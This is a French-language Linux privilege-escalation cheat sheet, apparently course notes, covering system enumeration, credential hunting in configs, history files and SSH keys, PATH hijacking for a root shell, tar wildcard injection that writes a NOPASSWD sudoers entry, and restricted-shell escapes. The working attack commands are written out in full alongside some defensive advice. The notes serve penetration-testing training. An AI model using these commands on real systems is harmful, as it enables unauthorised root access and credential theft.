@@ -1,1 +1,579 @@
+# Information Gathering
+
+---
+
+# Environment Enumeration — Cheat Sheet
+
+## Objectif
+Obtenir un maximum d’informations sur le système compromis (OS, kernel, services, utilisateurs, fichiers sensibles, etc.) pour identifier des vecteurs d’escalade de privilèges.
+
+## 1) Informations de base
+
+### Identifier l’utilisateur & le système
+`whoami` → utilisateur actuel  
+`id` → UID, GID, groupes  
+`hostname` → nom du système  
+`cat /etc/os-release` → version & distribution  
+`uname -a` → version du kernel  
+`lscpu` → infos CPU  
+
+### Vérifier le PATH & les variables d’environnement
+`echo $PATH`  
+`env | less` → chercher creds, tokens, clés API  
+
+## 2) Vérifier les privilèges et sudo
+`sudo -l` → commandes accessibles sans mot de passe  
+`groups` → groupes de l’utilisateur  
+`getent group sudo` → membres du groupe sudo  
+
+## 3) Réseau & connectivité
+`ip a` → interfaces réseau  
+`route -n` → table de routage  
+`arp -a` → hôtes connus sur le réseau local  
+`cat /etc/resolv.conf` → DNS internes (utile pour AD)  
+
+## 4) Systèmes de fichiers & stockage
+
+### Périphériques & montages
+`lsblk` → disques et partitions  
+`df -h` → systèmes montés  
+`cat /etc/fstab` → disques montés ou montables  
+`mount | column -t` → points de montage actifs  
+
+### Fichiers et répertoires cachés
+`find / -type f -name ".*" 2>/dev/null`  
+`find / -type d -name ".*" 2>/dev/null`  
+
+### Fichiers temporaires
+`ls -l /tmp /var/tmp /dev/shm`  
+→ Ces dossiers sont souvent accessibles en écriture (cibles pour scripts / persistence).
+
+## 5) Défenses & sécurité
+`aa-status` → AppArmor  
+`sestatus` → SELinux  
+`ufw status` → pare-feu simple  
+`ps aux | grep fail2ban`  
+`systemctl list-units | grep snort`  
+
+→ Savoir quelles protections sont actives avant exploitation.
+
+## 6) Utilisateurs et groupes
+
+### Lister utilisateurs et shells
+`cat /etc/passwd` → utilisateurs  
+`grep "sh$" /etc/passwd` → comptes avec un shell valide  
+`cat /etc/group` → groupes & membres  
+`ls /home` → répertoires utilisateurs  
+
+### Identifier les hashes (si visibles)
+- `$1$` → MD5  
+- `$5$` → SHA-256  
+- `$6$` → SHA-512  
+- `$2a$` → bcrypt  
+- `$argon2i$` → Argon2  
+
+→ Si hash lisible, extraction pour **cracking offline**.
+
+## 7) Services, tâches et processus
+`ps aux` → processus actifs  
+`netstat -tulnp` → ports ouverts & PID  
+`systemctl list-units --type=service --state=running`  
+`crontab -l; ls -la /etc/cron*` → tâches planifiées  
+
+→ Repérer services tournant en **root** ou scripts mal sécurisés.
+
+## 8) Fichiers sensibles & config leaks
+`find / -type f \( -name "*.conf" -o -name "*.config" \) 2>/dev/null | grep -Ei "pass|user|cred"`  
+`grep -R "password" /etc 2>/dev/null`  
+`grep -R "PRIVATE KEY" /home 2>/dev/null`  
+
+→ Les fichiers `.bash_history`, `.ssh/`, `.git/`, `.env` sont des cibles prioritaires.
+
+## 9) Méthodologie & bonnes pratiques
+- Toujours **documenter** chaque commande & sortie clé.  
+- Identifier versions vulnérables (kernel, services).  
+- Vérifier privilèges d’écriture sur scripts/services.  
+- Explorer `/tmp` et `/var/tmp` pour fichiers temporaires.  
+- Lister clés SSH & historiques de commandes.
+
+## 10) Ressources & outils automatisés
+- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Script complet d’énumération Linux.  
+- [LinEnum](https://github.com/rebootuser/LinEnum): Script d’énumération OS / kernel / users / perms.  
+- [Linux Smart Enumeration (LSE)](https://github.com/diego-treitos/linux-smart-enumeration): Version allégée interactive.  
+- [pspy](https://github.com/DominicBreuker/pspy): Surveillance des processus sans root.  
+- [LES (Linux Exploit Suggester)](https://github.com/The-Z-Labs/linux-exploit-suggester): Recherche d’exploits kernel.
+
+---
+
+# Linux Services & Internals Enumeration
+
+## Objectif
+Obtenir une vue complète de l’état interne du système Linux : services, connexions, processus, utilisateurs actifs, tâches planifiées, paquets installés et fichiers sensibles — afin d’identifier des vecteurs d’exploitation ou d’escalade de privilèges.
+
+## 1) Réseau et interfaces
+
+### Interfaces réseau & IP
+`ip a` → adresses et interfaces  
+`ifconfig` → alternative si net-tools est installé  
+`route -n` ou `netstat -rn` → table de routage  
+`cat /etc/resolv.conf` → serveurs DNS (utile pour AD)  
+`cat /etc/hosts` → hôtes locaux configurés manuellement  
+
+## 2) Utilisateurs & connexions
+
+### Dernières connexions
+`lastlog` → historique de connexion des utilisateurs  
+`last` → sessions récentes  
+`w` ou `who` → utilisateurs actuellement connectés  
+`finger` → détails supplémentaires sur les sessions (si dispo)  
+
+## 3) Historique & commandes utilisateurs
+
+### Historique bash & scripts
+`history` → commandes récentes  
+`cat ~/.bash_history` → historique utilisateur actuel  
+`find / -type f \( -name *_hist -o -name *_history \) 2>/dev/null` → fichiers d’historique cachés  
+
+### Chercher infos sensibles
+`grep -Ei "pass|key|token" ~/.bash_history` → recherche de secrets  
+`grep -R "password" /home/* 2>/dev/null`  
+
+## 4) Tâches planifiées & automatisation
+
+### Cron Jobs
+`ls -la /etc/cron.* /var/spool/cron`  
+`cat /etc/crontab`  
+`systemctl list-timers --all`  
+→ Identifier scripts ou binaires exécutés avec privilèges root.
+
+### Vérifier permissions
+`ls -l /etc/cron.daily/`  
+→ Si un script root est modifiable par l’utilisateur → **escalade directe**.
+
+## 5) Processus & services
+
+### Processus actifs
+`ps aux` → liste complète des processus  
+`ps aux | grep root` → processus root  
+`systemctl list-units --type=service --state=running`  
+`netstat -tulnp` → services & ports actifs  
+`ss -tulwnp` → alternative moderne  
+
+### /proc filesystem
+`find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"`  
+→ montre les commandes exécutées, chemins et sockets en cours d’utilisation.  
+
+## 6) Paquets & binaires
+
+### Paquets installés
+`apt list --installed`  
+ou pour exporter :  
+`apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' > installed_pkgs.list`  
+
+### Version de sudo
+`sudo -V` → version vulnérable ? (vérifier CVE sur GTFOBins / exploitdb)
+
+### Binaries présents
+`ls -l /bin /usr/bin /usr/sbin`  
+→ vérifier exécutables disponibles pour l’utilisateur.
+
+### GTFObins check
+Comparer les binaires présents avec ceux exploitables :
+```bash
+for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d'); do 
+  if grep -q "$i" installed_pkgs.list; then 
+    echo "Check GTFO for: $i"; 
+  fi; 
+done
+```
+
+## 7) Tracer les appels système
+
+### Strace
+`strace <commande>` → suivre appels système & fichiers ouverts  
+Ex :  
+`strace ping -c1 10.129.112.20`  
+→ permet de voir connexions réseau, fichiers de config lus, etc.  
+
+## 8) Fichiers de configuration & scripts
+
+### Config files
+`find / -type f \( -name "*.conf" -o -name "*.config" \) 2>/dev/null`  
+→ rechercher creds ou chemins sensibles.  
+
+### Scripts
+`find / -type f -name "*.sh" 2>/dev/null | grep -v "snap\|share"`  
+→ scripts custom d’admin souvent exploitables (droits, contenu).  
+
+## 9) Outils disponibles
+
+Lister outils installés pour évaluer possibilités de pivot ou d’exploitation :  
+`which nc perl python ruby gcc nmap tcpdump wget curl`  
+→ si présents : utilisables pour reverse shell, exfiltration, ou pivot.  
+
+## 10) Analyse complémentaire
+
+### Chercher fichiers récemment modifiés
+`find / -mtime -2 2>/dev/null` → fichiers modifiés récemment  
+→ utile pour repérer backups, logs, scripts actifs.  
+
+### Recherche de backups
+`find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.save" \) 2>/dev/null`  
+
+## 11) Résumé des cibles clés à examiner
+- **/etc/** → fichiers de configuration critiques  
+- **/home/** → historiques, clés SSH, scripts  
+- **/var/log/** → logs contenant infos d’authentification  
+- **/tmp /var/tmp /dev/shm** → fichiers temporaires modifiables  
+- **/proc/** → infos runtime (processus, sockets, env)  
+
+## 12) Outil recommandé
+- [GTFOBins](https://gtfobins.github.io/): base de binaires exploitables localement.  
+
+---
+
+# Credential Hunting
+
+## Objectif
+Identifier et extraire tous les **identifiants stockés localement** : mots de passe, clés SSH, tokens, ou configurations sensibles, afin de faciliter l’escalade de privilèges ou le pivot vers d’autres systèmes.
+
+## 1) Fichiers de configuration & scripts
+
+### Rechercher fichiers contenant des credentials
+`find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null`  
+`find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.xml" -o -name "*.ini" \) 2>/dev/null`  
+`grep -Ri "password\|pass\|user\|login\|key\|token" /etc /var /home 2>/dev/null`  
+
+→ Les fichiers `.conf`, `.xml`, `.env`, `.ini` ou `.bak` sont souvent riches en infos sensibles.
+
+### Exemple : WordPress config
+`grep 'DB_USER\|DB_PASSWORD' /var/www/html/wp-config.php`  
+```
+define( 'DB_USER', 'wordpressuser' );
+define( 'DB_PASSWORD', 'WPadmin123!' );
+```
+→ Credentials MySQL trouvés : exploitables pour base de données ou pivot réseau.
+
+## 2) Emplacements typiques à vérifier
+- `/var/www/` → fichiers de sites web (WordPress, Joomla, CMS)  
+- `/etc/` → configurations système et de services  
+- `/opt/` ou `/srv/` → apps personnalisées avec fichiers secrets  
+- `/home/*` → scripts, configs, ou historiques utilisateurs  
+- `/var/spool/` ou `/var/mail/` → fichiers de mail pouvant contenir credentials  
+
+## 3) Fichiers d’historique
+`cat ~/.bash_history`  
+`grep -Ei "pass|key|user|ssh" ~/.bash_history`  
+`grep -R "password" /home/* 2>/dev/null`  
+
+→ Les utilisateurs laissent souvent des mots de passe dans des commandes ou scripts.
+
+## 4) Fichiers de sauvegarde & copies
+`find / -type f \( -name "*.bak" -o -name "*.old" -o -name "*.save" -o -name "*.swp" \) 2>/dev/null`  
+→ Les fichiers de backup contiennent souvent des versions non chiffrées de configs sensibles.
+
+## 5) Clés SSH & accès distants
+
+### Rechercher clés SSH
+`find / -type f -name "id_rsa*" 2>/dev/null`  
+`ls -la ~/.ssh`  
+→ Les fichiers `id_rsa` ou `id_dsa` sont des **clés privées** exploitables pour SSH.
+
+### Vérifier hôtes connus
+`cat ~/.ssh/known_hosts`  
+→ permet d’identifier les serveurs déjà contactés (utile pour le **lateral movement**).
+
+### Exemple :
+```
+id_rsa  
+id_rsa.pub  
+known_hosts
+```
+→ Essayer d’utiliser `id_rsa` pour se connecter à un autre utilisateur ou hôte :  
+`ssh -i id_rsa user@target`  
+
+## 6) Autres emplacements possibles
+- `/root/.ssh/` → clés root (si accessibles)  
+- `/etc/ssh/` → configuration SSH globale  
+- `/var/backups/` → anciennes configs système  
+- `/etc/passwd` & `/etc/shadow` → hashes à exfiltrer si lisibles  
+
+## 7) Fichiers d’application contenant des secrets
+- `.git/config` ou `.git-credentials`  
+- `.aws/credentials` (AWS)  
+- `.docker/config.json`  
+- `.npmrc`, `.pypirc` → tokens API  
+- `settings.py`, `.env` → souvent mots de passe DB ou SMTP  
+
+## 8) Outils utiles pour la chasse aux credentials
+- `grep` → recherche rapide dans tout le système  
+- `strings` → extraire texte lisible depuis fichiers binaires  
+- `cat`, `less`, `head` → lecture simple  
+- `find` + `grep` → combinaison pour automatiser la recherche  
+- `linPEAS` → inclut détection automatique de fichiers sensibles  
+
+## 9) Ressources recommandées
+- [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Recherche automatisée de credentials et secrets.  
+- [Pspy](https://github.com/DominicBreuker/pspy): Observation de scripts pouvant révéler des creds en exécution.  
+- [GitTools](https://github.com/internetwache/GitTools): Extraction de credentials depuis repos git.  
+
+---
+
+# Environment-based Privilege Escalation
+
+---
+# Path Abuse — Cheat Sheet
+
+## Objectif
+Exploiter des failles liées à la variable d’environnement **PATH** pour exécuter un script malveillant à la place d’un binaire légitime, et ainsi obtenir une escalade de privilèges ou une exécution arbitraire de code.
+
+## 1) Comprendre la variable PATH
+
+### Définition
+`PATH` contient la liste des **répertoires** où le système recherche les exécutables lorsqu’une commande est saisie sans chemin complet.
+
+Exemple :  
+`cat /tmp/test.txt` → exécute `/bin/cat` car `/bin` est dans le `PATH`.
+
+### Vérifier le PATH
+`echo $PATH`  
+ou  
+`env | grep PATH`
+
+Exemple :
+```
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+```
+
+## 2) Exploitation de base
+
+### Principe
+Si un utilisateur ou un script exécute une commande **sans spécifier le chemin absolu**, le système exécutera **le premier binaire trouvé** dans l’ordre du `PATH`.
+
+Si on peut écrire dans un dossier inclus dans le `PATH`, on peut y placer un script malveillant.
+
+## 3) Démonstration
+
+### Étape 1 : Créer un script dans un dossier du PATH
+```bash
+cd /usr/local/sbin
+echo 'netstat -antp' > conncheck
+chmod +x conncheck
+```
+
+### Étape 2 : Exécuter depuis un autre dossier
+```bash
+cd /tmp
+conncheck
+```
+Le script s’exécute même en dehors de `/usr/local/sbin` car ce dossier est dans le `PATH`.
+
+## 4) Ajouter le répertoire courant au PATH
+
+### Ajouter “.” au PATH
+```bash
+PATH=.:$PATH
+export PATH
+echo $PATH
+```
+
+Résultat :
+```
+.:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+```
+Le `.` (répertoire courant) est prioritaire, donc tout script dans le dossier actuel est exécuté avant les vrais binaires système.
+
+## 5) Exemple d’abus
+
+### Créer un faux `ls` pour détourner une commande
+```bash
+touch ls
+echo 'echo "PATH ABUSE!!"' > ls
+chmod +x ls
+```
+
+### Exécution :
+```bash
+ls
+```
+Sortie :
+```
+PATH ABUSE!!
+```
+
+On a remplacé le comportement de la commande `ls`.
+
+## 6) Cas d’exploitation en réel
+
+- Si un **script root** appelle une commande sans chemin absolu (`tar`, `cp`, `ls`, `cat`, etc.),  
+  et que l’utilisateur courant peut modifier un dossier inclus dans le `PATH`,  
+  → il est possible de **remplacer la commande par un script malveillant** (ex. reverse shell).
+
+### Exemple :
+```bash
+echo '/bin/bash -p' > /tmp/cp
+chmod +x /tmp/cp
+export PATH=/tmp:$PATH
+```
+Si un script root exécute `cp`, alors `/tmp/cp` sera appelé → **shell root obtenu**.
+
+## 7) Bonnes pratiques de défense
+
+- Toujours utiliser des **chemins absolus** dans les scripts : `/bin/ls` au lieu de `ls`.  
+- Ne **jamais** inclure `.` dans le PATH.  
+- Restreindre les permissions en écriture sur les dossiers du PATH.  
+- Vérifier le PATH avant exécution de scripts sensibles : `echo $PATH`.
+
+---
+
+# Wildcard Abuse
+
+## Objectif
+Exploiter l’interprétation des **caractères génériques (wildcards)** par le shell pour injecter des options malveillantes dans des commandes exécutées par des scripts ou des **cron jobs root**, menant à une **escalade de privilèges**.
+
+## 1) Comprendre les wildcards
+
+| Caractère | Fonction |
+|------------|-----------|
+| `*` | Remplace n’importe quelle chaîne de caractères |
+| `?` | Remplace un seul caractère |
+| `[ ]` | Définit un ensemble ou une plage de caractères |
+| `~` | Se traduit par le répertoire home de l’utilisateur |
+| `-` | Dans `[a-z]`, indique une plage de caractères |
+
+Les wildcards sont **interprétées par le shell avant exécution**, ce qui permet d’injecter des options inattendues dans certaines commandes.
+
+## 2) Commandes vulnérables
+Certaines commandes (comme `tar`, `rsync`, `cp`, `chmod`, `chown`, etc.) interprètent les arguments précédés de `--`, ce qui permet d’injecter des **options supplémentaires** lors de l’exécution.
+
+Exemple : `tar` permet d’exécuter une commande via  
+`--checkpoint` et `--checkpoint-action=exec=<commande>`.
+
+## 3) Exemple concret : abus d’un cron job
+
+### Cron job vulnérable
+```
+*/1 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
+```
+Le `*` permet d’injecter des fichiers nommés comme des **arguments tar**, donc exploitables.
+
+## 4) Exploitation pas à pas
+
+### Étape 1 — Créer un script malveillant
+```bash
+echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+```
+Ce script ajoute des droits root sans mot de passe à l’utilisateur.
+
+### Étape 2 — Créer des fichiers “arguments tar”
+```bash
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint=1
+```
+
+### Étape 3 — Vérifier les fichiers
+```bash
+ls -la
+```
+Doit afficher :
+```
+--checkpoint=1
+--checkpoint-action=exec=sh root.sh
+root.sh
+```
+
+### Étape 4 — Attendre que le cron job s’exécute
+Une fois le `tar` lancé automatiquement, il exécutera la commande suivante :
+```
+tar -zcf backup.tar.gz * --checkpoint=1 --checkpoint-action=exec=sh root.sh
+```
+Résultat : `root.sh` est exécuté avec les **privilèges root**.
+
+
+## 5) Vérifier la réussite
+```bash
+sudo -l
+```
+Résultat attendu :
+```
+(root) NOPASSWD: ALL
+```
+Puis :
+```bash
+sudo su
+```
+Shell root obtenu.
+
+## 6) Conditions requises
+- Le cron job ou script exécute une commande vulnérable avec `*` ou autre wildcard.  
+- Vous avez les **droits d’écriture** dans le répertoire où la commande est exécutée.  
+- La commande est exécutée par un **utilisateur privilégié (souvent root)**.
+
+## 7) Défense & prévention
+- Toujours **utiliser des chemins explicites** dans les scripts (`tar -zcf /home/user/backup.tar.gz /home/user/*`).  
+- Ne jamais exécuter `tar`, `cp`, etc. avec des wildcards dans des scripts root.  
+- Exécuter les commandes avec `--warning=no-wildcards` ou `set -f` (désactive les wildcards).  
+- Restreindre les permissions d’écriture sur les répertoires exécutés par des cron jobs.
+
+## 8) Outils utiles
+- `pspy` → détecter les cron jobs exécutés automatiquement.  
+- `LinPEAS` → identifie les scripts root utilisant des wildcards.  
+- `Tar man page` → comprendre les options exploitables comme `--checkpoint-action`.
+
+---
+
+# Escaping Restricted Shells
+
+## Objectif
+Contourner les **shells restreints (rbash, rksh, rzsh)** pour retrouver un shell complet et exécuter librement des commandes système.
+
+## 1) Types de restricted shells
+| Shell | Description |
+|--------|--------------|
+| **rbash** | Bourne shell limité — empêche `cd`, export de variables, exécution hors PATH. |
+| **rksh** | Korn shell restreint — bloque les fonctions et modifications d’environnement. |
+| **rzsh** | Z shell restreint — limite scripts, alias et environnement. |
+
+## 2) Méthodes d’évasion
+
+### ➤ Command Substitution
+Exécuter une commande via backticks ou `$()` :
+```bash
+ls -l `pwd`
+ls -l $(whoami)
+```
+
+### Command Injection
+Injecter des commandes dans des arguments autorisés :
+```bash
+echo test; /bin/bash
+```
+
+### Command Chaining
+Utiliser `;`, `|`, ou `&&` pour chaîner plusieurs commandes :
+```bash
+ls; bash
+```
+
+### Variables d’environnement
+Modifier le PATH ou SHELL :
+```bash
+export PATH=/bin:/usr/bin:$PATH
+export SHELL=/bin/bash
+/bin/bash
+```
+
+### Shell Functions
+Définir une fonction pour lancer un shell :
+```bash
+shell(){ /bin/bash; }
+shell
+```
+
+## 3) Autres astuces rapides
+- Essayer d’ouvrir un **éditeur interactif** (vi, less, man) puis exécuter `:!bash`.  
+- Tenter `python -c 'import pty;pty.spawn("/bin/bash")'`.  
+- Si autorisé : `ssh user@host /bin/bash` pour contourner le shell restreint.  
+
+---
 
